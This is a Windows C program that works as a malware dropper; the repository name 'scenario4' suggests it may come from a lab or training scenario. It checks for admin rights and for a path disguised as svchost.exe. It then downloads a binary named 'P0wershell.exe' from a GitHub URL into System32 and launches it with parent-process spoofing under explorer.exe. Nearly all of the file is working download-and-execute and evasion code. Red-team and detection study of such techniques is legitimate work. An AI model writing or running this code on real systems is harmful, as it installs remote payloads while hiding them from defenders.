#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <urlmon.h>

BOOL WINAPI IsUserAnAdmin(void);

int main(void) {
    if (!IsUserAnAdmin())
        return 1;

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
        return 1;

    printf("[+] Running in Elevated Session.\n");

    // find explorer.exe PID
    DWORD explorerPID = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (lstrcmpiA(pe.szExeFile, "explorer.exe") == 0) {
                    explorerPID = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    if (explorerPID == 0) {
        printf("[-] No explorer.exe found.\n");
        return 1;
    }
    printf("[+] Found explorer.exe PID: %lu\n", explorerPID);

    // download P0wershell.exe
    const char* url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/P0wershell.exe";
    const char* outPath = "C:\\Windows\\System32\\P0wershell.exe";
    printf("[+] Downloading P0wershell.exe...\n");
    HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
    if (hr != S_OK) {
        printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
        return 1;
    }
    printf("[+] Download complete.\n");

    // PPID spoofing
    HANDLE hExplorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPID);
    if (!hExplorer) {
        printf("[-] Failed to open explorer.exe (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Opened explorer.exe handle\n");

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    PPROC_THREAD_ATTRIBUTE_LIST attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!attrList) {
        printf("[-] HeapAlloc failed\n");
        CloseHandle(hExplorer);
        return 1;
    }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
        printf("[-] InitializeProcThreadAttributeList failed (%lu)\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hExplorer);
        return 1;
    }

    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(HANDLE), NULL, NULL)) {
        printf("[-] UpdateProcThreadAttribute failed (%lu)\n", GetLastError());
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hExplorer);
        return 1;
    }
    printf("[+] PPID attribute set\n");

    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(STARTUPINFOEXA) }, .lpAttributeList = attrList };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hExplorer);
        return 1;
    }
    printf("[+] P0wershell.exe launched with PPID spoofing (PID: %lu)\n", pi.dwProcessId);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hExplorer);

    Sleep(2000);
    return 0;
}
